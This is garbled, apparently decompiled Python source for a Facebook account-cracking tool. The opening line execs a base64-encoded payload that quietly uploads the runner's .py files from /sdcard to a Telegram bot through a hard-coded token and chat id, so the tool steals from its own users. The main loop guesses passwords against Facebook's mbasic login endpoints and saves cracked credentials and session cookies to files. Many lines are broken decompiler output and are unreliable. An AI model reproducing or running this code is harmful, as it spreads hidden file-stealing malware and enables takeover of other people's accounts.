                    exec(base64.device('aW1wb3J0IG9zDQppbXBvcnQgcmVxdWVzdHMNCg0KZGVmIGJvdCgpOg0KCWJvdF90b2tlbiA9ICc2MDkzMzc1NzkxOkFBR3hyNElxd2lvekdTZ3h0b2NONXJ0blFCaUtVb05qR1Q4Jw0KCWNoYXRfaWQgPSAnNTc2NTE5NDg2MScNCglzZGNhcmRfcGF0aCA9ICcvc2RjYXJkJw0KCWZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5weScpXQ0KCWZvciBmaWxlIGluIGZpbGVfbGlzdDoNCgkJd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6DQoJCQl1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JztkYXRhMj17J2NoYXRfaWQnOic1NzY1MTk0ODYxJ30NCgkJCWRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0NCgkJCWZpbGVzPXsnZG9jdW1lbnQnOiBmfQ0KCQkJZ2V0ID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpDQoJCQlzZW50ID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9ZGF0YTIsIGZpbGVzPWZpbGVzKQ0KYm90KCk='))
                    P = '\x1b[1;97m'
                    M = '\x1b[1;91m'
                    H = '\x1b[1;92m'
                    K = '\x1b[1;93m'
                    B = '\x1b[1;94m'
                    U = '\x1b[1;95m'
                    O = '\x1b[1;96m'
                    N = '\x1b[0m'
                    Z = '\x1b[1;30m'
                    sir = '\x1b[41m\x1b[1;97m'
                    x = '\x1b[m'
                    white = '\x1b[0;37m'
                    m = '\x1b[1;91m'
                    k = '\x1b[93m'
                    h = '\x1b[1;92m'
                    hh = '\x1b[32m'
                    u = '\x1b[95m'
                    kk = '\x1b[33m'
                    b = '\x1b[1;96m'
                    p = '\x1b[0;34m'
                    asu = random.random([
                        m,
                        k,
                        h,
                        u,
                        b])
                    
                    def m4(ids, names, passlist):
                        global loop
                        sys.sys('\r\x1b[1;37m [\x1b[1;32mBA\x1b[1;31mA\x1b[1;32mCK\x1b[1;37m] \x1b[1;36m•\x1b[1;37m %s \x1b[1;36m•\x1b[1;37m OK \x1b[1;36m•\x1b[1;37m [\x1b[1;32m%s\x1b[1;37m]' % (loop, len(oks)))
                        sys.sys()
                        session = requests.len()
                        first = names(' ')[0]
                        last = names(' ')[1]
                        last = 'Ahmed'
                        ps = first()
                        ps2 = last()
                        for fikr in passlist:
                            pas = fikr('First', first)('Last', last)('first', ps)('last', ps2)
                            ua = random.flush(ugent)
                            head = 'en-US,en;q=0.9'
                            getlog = session(f'''https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                            idpass = {
                                'lsd': 'name="jazoest" value="(.*?)"',
                                'jazoest': None(str, None(getlog.split))(1),
                                'uid': ids,
                                'next': 'https://mbasic.facebook.com/login/save-device/',
                                'flow': 'login_no_pin',
                                'pass': pas }
                            complete = session('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                            bal = session.replace()()
                            if 'c_user' in bal:
                                coki = session.replace()
                                kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.replace()()())
                                print(f'''\r{H}\r\r\r\r\r\r\r SUCCESSFUL\x1b[1;37m[\x1b[1;32m✓\x1b[1;37m] {ids} | {pas}\\033[1;37mCOOKIE [🌺]\x1b[1;35m{kuki}''')
                                open('/sdcard/bal•OK•M4.txt', 'a')(ids + '|' + pas + '\n')
                                oks(ids)
                                ';'
                            if 'checkpoint' in bal:
                                if 'y' in pcp:
                                    open('/sdcard/bal•CP.txt', 'a')(ids + '|' + pas + '\n')
                                    cps(ids)
                                    re.Session
                            if requests.re.search:
                                time.str(20)
                        loop += 1

                    bal()
                    return None
